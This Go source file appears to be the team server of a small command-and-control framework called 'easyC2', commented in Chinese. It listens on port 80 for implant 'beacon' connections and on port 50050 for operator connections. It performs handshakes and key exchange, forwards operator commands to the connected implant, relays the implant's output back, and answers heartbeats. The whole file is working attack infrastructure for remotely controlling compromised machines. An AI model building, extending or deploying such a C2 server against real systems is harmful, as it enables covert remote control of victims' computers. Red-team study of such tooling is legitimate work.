package main

import (
	"easyC2/common"
	"fmt"
	"net"
	"sync"
	"time"
)

type Conn struct {
	ClientConn  *common.BeaconConnection
	ControlConn *common.BeaconConnection
	mu          sync.Mutex
}

var C *Conn = new(Conn)

const ClientListenPort string = ":80"
const ControlListenPort string = ":50050"

// 添加一个全局互斥锁来保护Conn的访问
var connMutex sync.Mutex

func (c *Conn) ListenControl() {
	listen, err := net.Listen("tcp", ControlListenPort)
	if err != nil {
		fmt.Println("控制端口监听失败:", err)
		return
	}
	fmt.Println("控制端口监听中:", ControlListenPort)

	for {
		conn, err := listen.Accept()
		if err != nil {
			fmt.Println("接受控制连接失败:", err)
			continue
		}
		fmt.Println("新的控制连接已建立")

		// 创建beacon连接
		beaconConn := common.NewBeaconConnection(conn)
		
		// 处理握手
		err = beaconConn.HandleHandshake()
		if err != nil {
			fmt.Println("控制端握手失败:", err)
			conn.Close()
			continue
		}

		// 处理密钥交换
		err = beaconConn.HandleKeyExchange()
		if err != nil {
			fmt.Println("控制端密钥交换失败:", err)
			conn.Close()
			continue
		}

		// 使用锁保护对C的修改
		connMutex.Lock()
		C.ControlConn = beaconConn
		connMutex.Unlock()

		// 为每个控制连接启动一个单独的处理goroutine
		go C.DoControl(beaconConn)
	}
}

// 修改DoControl接收beacon连接参数
func (c *Conn) DoControl(controlConn *common.BeaconConnection) {
	fmt.Println("开始处理控制连接")
	for {
		msg, err := controlConn.ReadMessage()
		if err != nil {
			fmt.Println("从控制端读取失败:", err)
			break
		}

		// 处理不同类型的消息
		switch msg.Type {
		case common.BeaconData:
			command := string(msg.Payload)
			fmt.Println("从控制端收到命令:", command)

			// 获取客户端连接
			connMutex.Lock()
			clientConn := c.ClientConn
			connMutex.Unlock()

			if clientConn == nil {
				fmt.Println("客户端未连接，无法执行命令")
				// 向控制端发送错误消息
				controlConn.SendData([]byte("错误: 客户端未连接"))
				continue
			}

			// 将命令转发给客户端
			err = clientConn.SendData(msg.Payload)
			if err != nil {
				fmt.Println("向客户端发送命令失败:", err)
				controlConn.SendData([]byte("错误: 向客户端发送命令失败"))
			}

		case common.BeaconHeartbeat:
			// 回复心跳
			controlConn.SendMessage(common.BeaconHeartbeatAck, []byte("heartbeat_ack"))

		default:
			fmt.Printf("收到未知消息类型: %d\n", msg.Type)
		}
	}
}

func (c *Conn) ListenClient() {
	listen, err := net.Listen("tcp", ClientListenPort)
	if err != nil {
		fmt.Println("客户端端口监听失败:", err)
		return
	}
	fmt.Println("客户端端口监听中:", ClientListenPort)

	for {
		conn, err := listen.Accept()
		if err != nil {
			fmt.Println("接受客户端连接失败:", err)
			continue
		}
		fmt.Println("新的客户端连接已建立")

		// 创建beacon连接
		beaconConn := common.NewBeaconConnection(conn)
		
		// 处理握手
		err = beaconConn.HandleHandshake()
		if err != nil {
			fmt.Println("客户端握手失败:", err)
			conn.Close()
			continue
		}

		// 处理密钥交换
		err = beaconConn.HandleKeyExchange()
		if err != nil {
			fmt.Println("客户端密钥交换失败:", err)
			conn.Close()
			continue
		}

		// 使用锁保护对C的修改
		connMutex.Lock()
		C.ClientConn = beaconConn
		connMutex.Unlock()

		// 为每个客户端连接启动一个单独的处理goroutine
		go C.DoClient(beaconConn)
	}
}

// 修改DoClient接收beacon连接参数
func (c *Conn) DoClient(clientConn *common.BeaconConnection) {
	fmt.Println("开始处理客户端连接")
	
	// 启动心跳
	clientConn.StartHeartbeat(30 * time.Second)
	
	for {
		msg, err := clientConn.ReadMessage()
		if err != nil {
			fmt.Println("从客户端读取失败:", err)
			break
		}

		// 处理不同类型的消息
		switch msg.Type {
		case common.BeaconData:
			// 获取控制连接
			connMutex.Lock()
			controlConn := c.ControlConn
			connMutex.Unlock()

			if controlConn == nil {
				fmt.Println("控制连接为空，无法转发客户端响应")
				continue
			}

			// 将客户端响应发送回控制端
			err = controlConn.SendData(msg.Payload)
			if err != nil {
				fmt.Println("向控制端发送响应失败:", err)
			}

		case common.BeaconHeartbeat:
			// 回复心跳
			clientConn.SendMessage(common.BeaconHeartbeatAck, []byte("heartbeat_ack"))

		default:
			fmt.Printf("收到未知消息类型: %d\n", msg.Type)
		}
	}
	fmt.Println("客户端连接处理结束")
}

func main() {
	fmt.Println("服务器启动...")
	go C.ListenClient()
	go C.ListenControl()

	// 阻塞主goroutine
	select {}
}
